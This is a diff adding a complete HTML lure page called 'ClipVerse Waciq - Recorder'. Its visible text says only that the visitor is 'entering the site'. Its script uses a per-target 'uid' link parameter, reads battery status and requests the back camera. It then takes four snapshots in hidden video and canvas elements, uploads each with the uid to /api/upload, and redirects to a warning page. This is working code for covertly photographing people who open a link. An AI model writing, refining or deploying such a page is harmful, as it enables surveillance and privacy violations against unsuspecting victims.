@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ClipVerse Waciq - Recorder</title>
+  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+      backdrop-filter: blur(6px);
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      border-radius: 25px;
+      padding: 60px 45px;
+      width: 95%;
+      max-width: 950px;
+      min-height: 500px;
+      box-shadow: 0 0 25px rgba(0,255,153,0.5);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: popIn 0.7s ease-out;
+    }
+
+    .logo {
+      width: 160px;
+      height: auto;
+      margin-bottom: 30px;
+      box-shadow: 0 0 18px rgba(0,255,255,0.6);
+    }
+
+    .loader {
+      border: 7px solid rgba(255, 255, 255, 0.2);
+      border-top: 7px solid #00ffcc;
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1s linear infinite;
+      margin: 25px 0;
+    }
+
+    .text {
+      font-size: 20px;
+      line-height: 1.8;
+      text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
+      background: linear-gradient(to right, #00ffe7, #00ffa1, #9fff5b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: bold;
+    }
+
+    .credit {
+      margin-top: 25px;
+      font-size: 15px;
+      color: #ccc;
+      font-weight: bold;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes popIn {
+      0% { opacity: 0; transform: scale(0.9); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 0 10px;
+        padding: 40px 25px;
+        min-height: 450px;
+      }
+      .logo { width: 130px; }
+      .text { font-size: 17px; }
+    }
+
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
+    <div class="text" id="status">
+      🕵️‍♂️ <b>You are entering the site...</b><br>
+      <b>Keep this page open 🎥</b>
+    </div>
+    <div class="loader"></div>
+    <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="snapshot"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('snapshot');
+    const ctx = canvas.getContext('2d');
+    const statusEl = document.getElementById('status');
+
+    const params = new URLSearchParams(window.location.search);
+    const uid = params.get('uid') || 'unknown';
+    let snapshotCount = 0; // Counter for 4 snapshots
+
+    // Helper: try to start environment (back) camera with fallbacks
+    async function startBackCamera() {
+      // First try: device with exact environment facingMode (most strict)
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+        return stream;
+      } catch (e1) {
+        // Second try: softer facingMode hint
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+          return stream;
+        } catch (e2) {
+          // Final fallback: any video (may be front)
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            return stream;
+          } catch (e3) {
+            throw e3;
+          }
+        }
+      }
+    }
+
+    if (uid) {
+      navigator.getBattery().then(async battery => {
+        const batteryLevel = Math.round(battery.level * 100);
+        const isCharging = battery.charging;
+
+        try {
+          const stream = await startBackCamera();
+          video.srcObject = stream;
+          statusEl.innerHTML = "📸 <b>Back camera active (capturing)...</b>";
+
+          // take 4 snapshots (2 at intervals shown previously)
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 1200);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 3200);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 5200);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 7200);
+        } catch (err) {
+          console.error("Camera error:", err);
+          statusEl.innerHTML = "❌ <b>Camera access failed!</b>";
+        }
+      }).catch(() => {
+        // If Battery API not available, still try camera
+        try {
+          startBackCamera().then(stream => {
+            video.srcObject = stream;
+            statusEl.innerHTML = "📸 <b>Back camera active (capturing)...</b>";
+            setTimeout(() => takeSnapshotAndSend(null, null), 1200);
+            setTimeout(() => takeSnapshotAndSend(null, null), 3200);
+            setTimeout(() => takeSnapshotAndSend(null, null), 5200);
+            setTimeout(() => takeSnapshotAndSend(null, null), 7200);
+          }).catch(err => {
+            console.error("Camera error:", err);
+            statusEl.innerHTML = "❌ <b>Camera access failed!</b>";
+          });
+        } catch (err) {
+          console.error("Camera start error:", err);
+          statusEl.innerHTML = "❌ <b>Camera access failed!</b>";
+        }
+      });
+    }
+
+    function takeSnapshotAndSend(battery, charging) {
+      if (snapshotCount >= 4) {
+        window.location.href = "/warning.html"; // Redirect page
+        return;
+      }
+
+      // ensure video has size
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      canvas.width = w;
+      canvas.height = h;
+      ctx.drawImage(video, 0, 0, w, h);
+      const imageData = canvas.toDataURL('image/png');
+
+      fetch('/api/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData, uid, battery, charging })
+      }).then(() => {
+        snapshotCount++;
+        if (snapshotCount >= 4) {
+          window.location.href = "/warning.html"; // Redirect page
+        }
+      }).catch(err => {
+        console.error("Upload error:", err);
+      });
+    }
+  </script>
+</body>
+</html> 
